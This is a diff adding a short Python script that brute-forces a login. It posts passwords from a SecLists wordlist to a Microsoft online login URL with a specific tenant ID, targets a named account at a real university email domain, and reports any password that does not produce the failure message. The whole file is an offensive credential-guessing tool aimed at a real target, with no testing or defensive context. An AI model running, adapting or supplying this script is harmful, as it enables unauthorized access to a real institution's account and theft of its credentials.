@@ -1,0 +1,39 @@
+import requests
+from termcolor import colored
+
+# Input fields
+url = "https://login.microsoftonline.com/cb5b9cf9-485d-4b6e-bf77-10f685027829/login"
+username = "help@unicross.edu.ng"
+password_file = "/home/ubuntu/SecLists/Passwords/*.txt"
+login_failed_string = "I am sorry is had to tell"
+cookie_value = input('Enter Cookie Value (Optional): ')
+
+def cracking(username, url):
+    # Iterating over the passwords list
+    with open(password_file, 'r') as passwords:
+        for password in passwords:
+            password = password.strip()  # Removing leading/trailing whitespace
+            print(colored(('Trying: ' + password), 'red'))
+
+            # Prepare the data for POST request
+            data = {'username': username, 'password': password, 'Login': 'submit'}
+
+            # Send the request with or without the cookie
+            if cookie_value:
+                cookies = {'Cookie': cookie_value}
+                response = requests.post(url, data=data, cookies=cookies)
+            else:
+                response = requests.post(url, data=data)
+
+            # Check if the login failed string is present in the response
+            if login_failed_string in response.text:
+                pass  # Continue with the next password if login failed
+            else:
+                print(colored(('[+] Found Username: ==> ' + username), 'green'))
+                print(colored(('[+] Found Password: ==> ' + password), 'green'))
+                exit()  # Exit the script if the password is found
+
+# Start the cracking process
+cracking(username, url)
+
+print('[!!] Password Not In List')
